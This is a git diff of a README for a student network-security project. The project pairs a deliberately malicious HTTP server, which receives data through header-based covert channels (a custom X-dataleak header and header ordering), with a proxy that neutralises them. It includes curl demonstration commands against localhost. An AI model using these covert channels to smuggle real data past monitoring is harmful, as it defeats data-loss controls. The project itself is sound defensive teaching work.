@@ -1,130 +1,183 @@
-# HTTP Data Leak — Proxy & Malicious Server
+# HTTP Data Leak — Proxy and Malicious Server
 
-This project demonstrates two HTTP-based covert channel data exfiltration techniques, alongside a proxy that detects and neutralizes them. It is implemented as a pair of Docker containers managed via Docker Compose.
+This project implements the network-security assignment scenario. It contains a malicious HTTP server that receives data through custom data-leak techniques, and a proxy/bridge that forwards client requests to the server while blocking the leak when the traffic passes through the proxy.
 
----
+The scenario is run with Docker Compose and starts two HTTP services:
 
-## Architecture
+- the proxy listens on `localhost:8000`;
+- the malicious server listens on `localhost:8001`.
 
-```
-[Client / Attacker]
-        |
-        | :8000
-        v
-  [ Proxy Server ]   <-- inspects and sanitizes PUT requests
-        |
-        | :8001 (internal)
-        v
-  [ Malicious Server ]  <-- receives and stores leaked data
-```
-
-- **Proxy** (port `8000`): transparently forwards all traffic to the malicious server, sanitizing PUT requests on registered entrypoints to neutralize data leaks.
-- **Malicious Server** (port `8001`): receives, stores, and exposes leaked data via a simple REST API.
+The direct server port is used to show that the leak techniques work. The proxy port is used to show that the same techniques are neutralized when the defensive bridge is used.
 
 ---
 
-## Requirements
+## 1. Architecture
 
-- [Docker](https://docs.docker.com/get-docker/)
-- [Docker Compose](https://docs.docker.com/compose/install/)
-- `curl` (for testing)
-- `bash` (for the test scripts)
+```text
+                    Protected path
+
+[ Client / data leaker ]
+          |
+          | HTTP on localhost:8000
+          v
+[ Proxy / bridge container ]
+          |
+          | HTTP to server:8001
+          v
+[ Malicious server container ]
+
+
+                    Direct test path
+
+[ Client / data leaker ] ---> HTTP on localhost:8001 ---> [ Malicious server ]
+```
+
+### Components
+
+The project has two main components.
+
+The `proxy` service listens on port `8000`. It behaves like a transparent bridge: it receives client requests, forwards them to the malicious server, receives the server response, and sends it back to the client. For configured leak entrypoints, it sanitizes only the malicious `PUT /<entrypoint>` requests.
+
+The `server` service listens on port `8001`. It is the malicious HTTP service. It registers dynamic entrypoints, receives data through the implemented covert channels, reconstructs the leaked value, stores it in memory, and returns it through `GET /<entrypoint>`.
+
+The proxy is intentionally separated from the malicious server. This models the case in which a network administrator cannot directly modify the service but can place a defensive bridge in front of it.
 
 ---
 
-## Running the Project
+## 2. Implemented leak techniques
 
-### 1. Clone / extract the project
+The implementation supports multiple independent leak activities at the same time. Each activity is identified by its own dynamic entrypoint, for example `/leak1`, `/sample`, or `/test_ho`.
 
-```bash
-unzip progetto_dataleak.zip
-cd progetto_dataleak
+### 2.1 Dedicated header — `dedicatedheader`
+
+The client transfers data through the custom HTTP header `X-dataleak`.
+
+Example direct leak request:
+
+```http
+PUT /sampleleak HTTP/1.1
+Host: localhost:8001
+X-dataleak: Y2lhbw==
 ```
 
-### 2. Build and start the containers
+Here `Y2lhbw==` is the Base64 representation of `ciao`.
 
-```bash
-docker compose up --build
+Server behavior:
+
+- the server reads the value of `X-dataleak`;
+- the value is stored as the leaked value for that entrypoint;
+- if the same entrypoint receives another dedicated-header leak, the newest value replaces the previous one.
+
+Proxy defense:
+
+- the proxy removes the leak-carrying header before forwarding the request;
+- as a result, the malicious server receives no useful data for that leak.
+
+### 2.2 Headers order — `headersorder`
+
+The client transfers one bit per HTTP request by changing the relative order of two headers.
+
+The implemented test convention is:
+
+```text
+Header-A before Header-B  -> bit 0
+Header-B before Header-A  -> bit 1
 ```
 
-This will:
-- Build and start the **proxy** container, listening on `localhost:8000`
-- Build and start the **malicious server** container, listening on `localhost:8001`
+Eight consecutive bits form one ASCII character. A sequence of eight zero bits, `00000000`, terminates the current string.
 
-To run in the background:
+For assignment usage, the logical payload should be Base64-encoded text. For example, the string `ciao` should be sent as the ASCII characters of `Y2lhbw==`, followed by the `00000000` terminator.
 
-```bash
-docker compose up --build -d
-```
+Server behavior:
 
-To stop:
+- each valid request contributes one bit to the entrypoint bit buffer;
+- every group of 8 bits is decoded as one ASCII character;
+- `00000000` terminates the current string;
+- data sent after a terminator starts a new value and replaces the previous reconstructed value.
 
-```bash
-docker compose down
-```
+Proxy defense:
+
+- the proxy changes the header sequence before forwarding the request;
+- this destroys the ordering-based bit encoding;
+- the server therefore reconstructs either no data or incorrect data, so the leak is neutralized.
 
 ---
 
-## Running Without Docker
+## 3. API reference
 
-Both services can also be run directly with Python (3.10+), without Docker.
+The same API is available through the proxy on port `8000` and directly on the malicious server on port `8001`.
 
-### Start the malicious server
+Use port `8000` to test the protected scenario. Use port `8001` only to show that the malicious server would work if the proxy were bypassed.
 
-```bash
-cd server
-python server.py
-```
+Important: in the protected scenario, send `POST /setup` through the proxy on port `8000`. The proxy records the entrypoint during setup; if setup is sent only to port `8001`, the malicious server knows the entrypoint but the proxy does not know that the corresponding `PUT` requests must be sanitized.
 
-### Start the proxy (in a separate terminal)
+### 3.1 `POST /setup`
 
-```bash
-cd proxy
-SERVER_HOST=localhost SERVER_PORT=8001 python proxy.py
-```
+Registers a dynamic leak entrypoint.
 
----
-
-## API Reference
-
-### `POST /setup`
-Registers a new entrypoint and associates a leak type to it.
+This request is forwarded by the proxy without sanitization.
 
 ```bash
 curl -X POST http://localhost:8000/setup \
   -H "Content-Type: application/json" \
-  -d '{"entrypoint": "myleak", "type": "dedicatedheader"}'
+  -d '{"entrypoint": "sampleleak", "type": "dedicatedheader"}'
 ```
 
-**Parameters:**
-- `entrypoint` (string): the URL path to register (e.g. `"myleak"` → `/myleak`)
-- `type` (string): the leak technique — `dedicatedheader` or `headersorder`
+Request body:
 
----
+| Field | Type | Description |
+| --- | --- | --- |
+| `entrypoint` | string | URI path to use for the leak. Both `sampleleak` and `/sampleleak` are accepted. |
+| `type` | string | Leak technique. Allowed values: `dedicatedheader`, `headersorder`. |
 
-### `PUT /<entrypoint>`
-Sends leaked data to a registered entrypoint.
+Expected result:
+
+- `200 OK` if the setup succeeds;
+- `400 Bad Request` if the leak type is not supported by the malicious server.
+
+### 3.2 `PUT /<entrypoint>`
+
+Sends data to the configured leak entrypoint.
+
+This is the only request type sanitized by the proxy.
+
+Dedicated-header example through the proxy:
 
 ```bash
-curl -X PUT http://localhost:8000/myleak \
+curl -X PUT http://localhost:8000/sampleleak \
   -H "X-dataleak: Y2lhbw=="
 ```
 
-PUT requests on registered entrypoints are intercepted and sanitized by the proxy.
-
----
-
-### `GET /<entrypoint>`
-Retrieves the data collected by the malicious server for a given entrypoint.
+Dedicated-header example bypassing the proxy:
 
 ```bash
-curl -X GET http://localhost:8001/myleak
+curl -X PUT http://localhost:8001/sampleleak \
+  -H "X-dataleak: Y2lhbw=="
 ```
 
----
+Expected result:
 
-### `DELETE /clear`
-Resets all server state (configs, leaked data, bit buffers). Always hits port `8001` directly.
+- through `8000`, the proxy sanitizes the request and the leak should fail;
+- through `8001`, the malicious server receives the leak directly and stores it.
+
+### 3.3 `GET /<entrypoint>`
+
+Retrieves the value reconstructed by the malicious server.
+
+```bash
+curl -X GET http://localhost:8000/sampleleak
+```
+
+Expected result:
+
+- `200 OK` with the reconstructed value if the entrypoint exists;
+- `404 Not Found` if the entrypoint has not been configured.
+
+### 3.4 `DELETE /clear`
+
+Clears all in-memory server state: configured entrypoints, leaked values, and partial bit buffers.
+
+This endpoint is intended for repeatable tests and demonstrations.
 
 ```bash
 curl -X DELETE http://localhost:8001/clear
@@ -132,164 +185,270 @@ curl -X DELETE http://localhost:8001/clear
 
 ---
 
-## Implemented Leak Techniques
+## 4. Requirements
 
-### 1. Dedicated Header (`dedicatedheader`)
-Data is transmitted in a custom HTTP header `X-dataleak`, carrying a base64-encoded payload.
+Install the following tools before running the project:
 
-**Example request:**
-```
-PUT /myleak HTTP/1.1
-Host: localhost
-X-dataleak: Y2lhbw==
-```
+- Docker
+- Docker Compose plugin (`docker compose`)
+- `curl`
+- a Bash-compatible shell
 
-**Proxy defense:** strips any header whose name is not in a whitelist of standard HTTP headers, blocking `X-dataleak` and any other non-standard header.
+No HTTPS configuration is required. The assignment tests the HTTP endpoints.
 
----
-
-### 2. Headers Order (`headersorder`)
-Data is encoded as a sequence of bits across multiple HTTP requests. Each request encodes one bit by the relative order of two headers (`Header-A` and `Header-B`):
-
-- `Header-A` before `Header-B` → bit `0`
-- `Header-B` before `Header-A` → bit `1`
-
-Every 8 bits form one ASCII character (base64-encoded). A sequence of eight `0` bits signals end of string.
-
-**Example (sending bit `0`):**
-```
-PUT /myleak HTTP/1.1
-Host: localhost
-Header-A: 1
-Header-B: 1
-```
-
-**Proxy defense:** randomly shuffles all headers except the first (`Host`), destroying the ordering signal.
+The services use in-memory state. Restarting the containers or calling `DELETE /clear` removes configured entrypoints, leaked values, and partial bit buffers.
 
 ---
 
-## Testing
+## 5. Run from scratch
 
-Three test scripts are provided. Make them executable first:
+### 5.1 Extract the submission archive
 
 ```bash
-chmod +x test_complete.sh test_tec1.sh test_tec2.sh
+unzip progetto_dataleak.zip
+cd progetto_dataleak
 ```
 
-### Full test suite
+If the archive has a different name, replace `progetto_dataleak.zip` with the actual file name.
+
+### 5.2 Build and start the containers
 
 ```bash
-./test_complete.sh <protected|unprotected|direct>
+docker compose up --build -d
 ```
 
-| Command | Description |
-|---|---|
-| `./test_complete.sh protected` | Both techniques through proxy with protection **enabled** |
-| `./test_complete.sh unprotected` | Both techniques **bypassing** the proxy (direct to server) |
-| `./test_complete.sh direct` | Both techniques hitting the server **directly** on port 8001 |
+This command builds both services and starts them in the background.
 
-### Expected results
+### 5.3 Check that both services are running
 
-| Scenario | Technique 1 | Technique 2 |
-|---|---|---|
-| `protected` | ✅ Blocked | ✅ Neutralized (garbage) |
-| `unprotected` | ✅ Leaked | ✅ Leaked |
-| `direct` | ✅ Leaked | ✅ Leaked |
+```bash
+docker compose ps
+```
+
+The expected exposed ports are:
+
+```text
+0.0.0.0:8000->8000/tcp    proxy
+0.0.0.0:8001->8001/tcp    server
+```
+
+### 5.4 View logs during the demonstration
+
+```bash
+docker compose logs -f
+```
+
+This is useful during the oral demonstration because the proxy prints when it protects an entrypoint and when it sanitizes a `PUT` request.
+
+### 5.5 Stop the environment
+
+```bash
+docker compose down
+```
 
 ---
 
-## Extending the System
+## 6. Automated tests
 
-The project is designed to make adding new leak techniques straightforward. Both the server and proxy use a plugin-style module system based on abstract base classes.
+Make the test scripts executable:
 
-### Step 1 — Implement the extractor (server side)
-
-Create `server/modules/my_technique.py`:
-
-```python
-from .base_module import DataLeakExtractor
-
-class MyTechniqueExtractor(DataLeakExtractor):
-    def extract(self, headers, entrypoint, leaked_data, bit_buffers):
-        # Read data from headers and store it in leaked_data[entrypoint]
-        pass
+```bash
+chmod +x test_complete.sh test_tec1.sh test_tec2.sh test_server.sh
 ```
 
-### Step 2 — Implement the sanitizer (proxy side)
+### 6.1 Complete protected test through the proxy
 
-Create `proxy/modules/my_technique.py`:
-
-```python
-from .base_module import DataLeakSanitizer
-
-class MyTechniqueSanitizer(DataLeakSanitizer):
-    def sanitize(self, headers_list):
-        # Remove or alter headers to neutralize the leak
-        return headers_list
+```bash
+./test_complete.sh 8000 on
 ```
 
-### Step 3 — Register the new technique
+Expected behavior:
 
-In `server/server.py`, add to the `EXTRACTORS` dict:
+- `dedicatedheader` does not leak the original value;
+- `headersorder` does not reconstruct the original string;
+- the script reports that the protected behavior is correct.
+
+### 6.2 Direct malicious-server test
+
+```bash
+./test_complete.sh 8001 on
+```
+
+Expected behavior:
+
+- `dedicatedheader` successfully stores and returns `dGVjMQ==`;
+- `headersorder` successfully reconstructs `tec2`;
+- this proves that the malicious server works when the proxy is bypassed.
+
+### 6.3 Individual tests
+
+The project also includes three smaller test scripts:
+
+- `test_server.sh` tests the dedicated-header leak directly on the malicious server, using port `8001`;
+- `test_tec1.sh` tests the dedicated-header leak through the proxy, using port `8000`;
+- `test_tec2.sh` demonstrates the headers-order technique directly on the server and through the proxy.
+
+Run them with:
+
+```bash
+./test_server.sh
+./test_tec1.sh
+./test_tec2.sh
+```
+
+Before each test, the scripts clear the server state with `DELETE /clear`.
+
+---
+
+## 7. Manual demonstration commands
+
+### 7.1 Dedicated header: direct server leak succeeds
+
+```bash
+curl -X DELETE http://localhost:8001/clear
+
+curl -X POST http://localhost:8001/setup \
+  -H "Content-Type: application/json" \
+  -d '{"entrypoint": "demo_direct", "type": "dedicatedheader"}'
+
+curl -X PUT http://localhost:8001/demo_direct \
+  -H "X-dataleak: Y2lhbw=="
+
+curl -X GET http://localhost:8001/demo_direct
+```
+
+Expected output:
+
+```text
+Y2lhbw==
+```
+
+### 7.2 Dedicated header: proxy blocks the leak
+
+```bash
+curl -X DELETE http://localhost:8001/clear
+
+curl -X POST http://localhost:8000/setup \
+  -H "Content-Type: application/json" \
+  -d '{"entrypoint": "demo_proxy", "type": "dedicatedheader"}'
+
+curl -X PUT http://localhost:8000/demo_proxy \
+  -H "X-dataleak: Y2lhbw=="
+
+curl -X GET http://localhost:8000/demo_proxy
+```
+
+Expected output:
+
+```text
+
+```
+
+The empty output means that the proxy forwarded the request but removed the data used by the covert channel.
+
+---
+
+## 8. Extensibility
+
+The implementation is organized around technique-specific modules. The core server and proxy logic dispatch work through registries:
+
+- server-side leak extractors are registered in `EXTRACTORS`;
+- proxy-side leak sanitizers are registered in `SANITIZERS`.
+
+This allows a new leak technique to be added without rewriting the HTTP routing logic.
+
+### 8.1 Add a new malicious-server extractor
+
+Create a new module under:
+
+```text
+server/modules/
+```
+
+The new extractor should implement the same interface used by the existing extractors:
 
 ```python
-from modules.my_technique import MyTechniqueExtractor
+extract(headers, entrypoint, leaked_data, bit_buffers)
+```
 
+The extractor receives the HTTP headers, the current entrypoint, the dictionary containing reconstructed values, and the dictionary containing partial bit buffers.
+
+Then register it in the server registry:
+
+```python
 EXTRACTORS = {
     "dedicatedheader": DedicatedHeaderExtractor(),
-    "headersorder":    HeadersOrderExtractor(),
-    "mytechnique":     MyTechniqueExtractor(),   # <-- add this
+    "headersorder": HeadersOrderExtractor(),
+    "newtechnique": NewTechniqueExtractor()
 }
 ```
 
-In `proxy/proxy.py`, add to the `SANITIZERS` dict:
+### 8.2 Add a new proxy sanitizer
+
+Create a new module under:
+
+```text
+proxy/modules/
+```
+
+The new sanitizer should implement the same interface used by the existing sanitizers:
 
 ```python
-from modules.my_technique import MyTechniqueSanitizer
+sanitize(headers_list)
+```
 
+The sanitizer receives the request headers as an ordered list of `(key, value)` pairs and must return the sanitized list to forward to the malicious server.
+
+Then register it in the proxy registry:
+
+```python
 SANITIZERS = {
     "dedicatedheader": DedicatedHeaderSanitizer(),
-    "headersorder":    HeadersOrderSanitizer(),
-    "mytechnique":     MyTechniqueSanitizer(),   # <-- add this
+    "headersorder": HeadersOrderSanitizer(),
+    "newtechnique": NewTechniqueSanitizer()
 }
 ```
 
-No other changes are needed. The new technique is immediately available via `/setup` using `"type": "mytechnique"`.
+### 8.3 Add tests for the new technique
+
+A new technique should include at least:
+
+- one direct-server test proving that the malicious server can reconstruct the data;
+- one proxy test proving that the same leak fails when routed through port `8000`.
 
 ---
 
-## Project Structure
+## 9. Project structure
 
-```
+```text
 progetto_dataleak/
+├── README.md
 ├── docker-compose.yml
+├── group_<groupname>.csv
+├── test_complete.sh
+├── test_server.sh
+├── test_tec1.sh
+├── test_tec2.sh
 ├── proxy/
 │   ├── Dockerfile
 │   ├── proxy.py
 │   ├── requirements.txt
 │   └── modules/
-│       ├── base_module.py          # Abstract base class: DataLeakSanitizer
-│       ├── dedicated_header.py     # Strips X-dataleak and non-standard headers
-│       └── headers_order.py        # Randomly shuffles headers
-├── server/
-│   ├── Dockerfile
-│   ├── server.py
-│   ├── requirements.txt
-│   └── modules/
-│       ├── base_module.py          # Abstract base class: DataLeakExtractor
-│       ├── dedicated_header.py     # Reads X-dataleak header value
-│       └── headers_order.py        # Reconstructs bits from header ordering
-└── test_complete.sh                # Full test suite (both techniques)
-└── test_tec1.sh                    # Dedicated header test only
-└── test_tec2.sh                    # Headers order test only
+│       ├── base_module.py
+│       ├── dedicated_header.py
+│       └── headers_order.py
+└── server/
+    ├── Dockerfile
+    ├── server.py
+    ├── requirements.txt
+    └── modules/
+        ├── base_module.py
+        ├── dedicated_header.py
+        └── headers_order.py
 ```
 
----
 
-## Authors
-
-| Name | Surname | Student ID (Matricola) |
-|---|---|---|
-| Leonardo | Necordi | S5642683 |
-| | | | 
-| | | |
+# Authors
+Leonardo Necordi, S5642683
+Anna Beardo, S5633630
+Luigi Trabucco, S5681875
